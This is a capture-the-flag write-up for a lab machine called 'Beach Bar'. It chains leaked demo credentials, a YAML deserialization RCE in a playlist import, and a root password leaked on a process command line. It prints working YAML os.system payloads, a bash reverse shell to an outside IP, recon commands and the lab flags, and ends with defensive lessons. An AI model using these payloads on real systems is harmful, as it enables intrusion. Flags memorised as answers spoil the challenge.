# Day 5 — Beach Bar

> Part of the [Hacker Holidays 2026 findings log](../FINDINGS.md).

- **Status:** ✅ Completed
- **Target:** `http://<MACHINE_IP>` — e.g. `http://10.144.134.194` (Flask app served by **gunicorn**; SSH on 22)
- **Category:** Web → Boot2Root (Easy) — insecure YAML deserialization (RCE) → credential reuse (privesc)
- **Points / difficulty:** 60 — labelled "Easy" in-room, but realistically **2/4** on the difficulty scale (the YAML-deserialization foothold and the `pspy`-based command-line secret leak are not beginner-obvious)
- **Objective:** Find the user flag and the root flag.
- **Story hook:** _"a DJ who never logs out, a song queue that accepts a little more than song titles, a service down the boardwalk quietly announcing 'something'"_ and _"the night-shift developer wired the jukebox straight into the floor with the trimmings still attached."_ Each phrase maps to a real vuln (leaked demo creds, YAML deser. in the playlist import, and the root password leaked on a process command line).
- **Attack path (summary):**
  1. **Recon:** ffuf found `/login` (200) plus `/dashboard`, `/export`, `/import`, `/logout` (302 → `/login`, i.e. auth-gated). `nmap -p-` → only 22 (SSH) + 80 (HTTP, gunicorn). SQLi on the login form was a dead end (decoy).
  2. **Leaked creds ("DJ who never logs out"):** the login page HTML contained a staff comment — `dj / dj` (ticket BAR-7, "demo DJ login still enabled"). Logged in as `dj:dj`.
  3. **Foothold — YAML deserialization RCE ("accepts more than song titles"):** the `/import` feature parses a playlist with `yaml.load(content, Loader=yaml.Loader)` (unsafe full loader). Submitting a malicious YAML payload with a `!!python/object/apply:os.system` tag executed commands as the web user. Confirmed with an ICMP callback, then swapped for a bash reverse shell → shell as **bartender** (the gunicorn worker user).
  4. **User flag:** in `/home/bartender/user.txt`.
  5. **Privesc — credential reuse ("a service quietly announcing something"):** `pspy` showed a **root** process (UID=0): `/opt/beach-bar/venv/bin/python /opt/beach-bar/jukeboxd/jukeboxd.py --stream-pass SunsetSpritz2024! --bitrate 320k`. The `--stream-pass` value was leaked on the command line (readable by any user via `ps`). That password was **reused as the root password** → `su root` with `SunsetSpritz2024!`.
  6. **Root flag:** `/root/root.txt`.
- **User flag:** <details><summary>click to reveal</summary><code>THM{y4ml_pl4yl1st_pwns_th3_b34ch}</code></details>
- **Root flag:** <details><summary>click to reveal</summary><code>THM{cr3d3nt14l_r3us3_4t_th3_b34ch_b4r}</code></details>
- **Lessons:**
  - Never use `yaml.load()` / `yaml.Loader` on untrusted input — it instantiates arbitrary Python objects (RCE). Use `yaml.safe_load()`.
  - Don't ship demo/default credentials (`dj:dj`) to production.
  - Never pass secrets as command-line arguments — they are world-readable via `ps`/`/proc/<pid>/cmdline`. Use env files or a secrets store.
  - Don't reuse a service password as the root password (credential reuse).

## Walkthrough

1. **Enumerate the app.** Directory brute-force and a full port scan:

   ```bash
   ffuf -u http://10.144.134.194/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -fc 404
   # -> login (200), dashboard/export/import/logout (302 -> /login)
   nmap -sC -sV -p- -T4 10.144.134.194
   # -> 22 OpenSSH, 80 gunicorn (Flask)
   ```

2. **Rule out the login SQLi** (decoy — every payload returns "Invalid credentials"), then read the login page source. An HTML comment leaks the demo creds:

   ```
   staff note: the demo DJ login is still enabled for the soft opening.
   dj / dj  -- swap this before the season starts (ticket BAR-7)
   ```

3. **Log in and reach the authenticated import feature:**

   ```bash
   curl -s -c cookies.txt -X POST http://10.144.134.194/login --data "username=dj&password=dj"
   curl -s -b cookies.txt http://10.144.134.194/dashboard    # -> "Import playlist" (accepts YAML)
   ```

4. **Confirm YAML-deserialization RCE** with an ICMP callback. Listener on the host (`sudo tcpdump -i any icmp`), then import this `playlist.yml` (tun0 IP = `192.168.139.84`):

   ```yaml
   !!python/object/apply:os.system
   - "ping -c 3 192.168.139.84"
   ```

   tcpdump showed the target's echo requests → RCE confirmed.

5. **Get a shell.** Start `nc -lvnp 4444`, then import the reverse-shell payload:

   ```yaml
   !!python/object/apply:os.system
   - "bash -c 'bash -i >& /dev/tcp/192.168.139.84/4444 0>&1'"
   ```

   Caught a shell as **bartender** in `/opt/beach-bar/webapp`. Stabilized with `python3 -c 'import pty;pty.spawn("/bin/bash")'`.

6. **User flag:**

   ```bash
   cat /home/bartender/user.txt   # THM{y4ml_pl4yl1st_pwns_th3_b34ch}
   ```

7. **Privesc enumeration.** `sudo -l` needed a password (none in `app.py` — it only had `dj:dj` and a fixed Flask key). SUID/`getcap`/cron were all stock. `pspy64` revealed the root-run jukebox daemon leaking a password on its command line:

   ```bash
   cd /tmp; wget http://192.168.139.84/pspy64; chmod +x pspy64; ./pspy64
   # CMD: UID=0 ... jukeboxd.py --stream-pass SunsetSpritz2024! --bitrate 320k
   ```

8. **Credential reuse → root.** The leaked stream password is the root password:

   ```bash
   su root            # password: SunsetSpritz2024!
   cat /root/root.txt # THM{cr3d3nt14l_r3us3_4t_th3_b34ch_b4r}
   ```

## Key host facts

| Item | Value |
| ---- | ----- |
| App | Flask (`/opt/beach-bar/webapp/app.py`) served by gunicorn as user `bartender` |
| Vuln sink | `yaml.load(content, Loader=yaml.Loader)` in the `/import` route |
| Demo creds | `dj:dj` (leaked in login-page HTML comment, ticket BAR-7) |
| Root daemon | `/opt/beach-bar/jukeboxd/jukeboxd.py` run as root (via systemd/service) |
| Leaked secret | `--stream-pass SunsetSpritz2024!` (visible in `ps`) = root password |
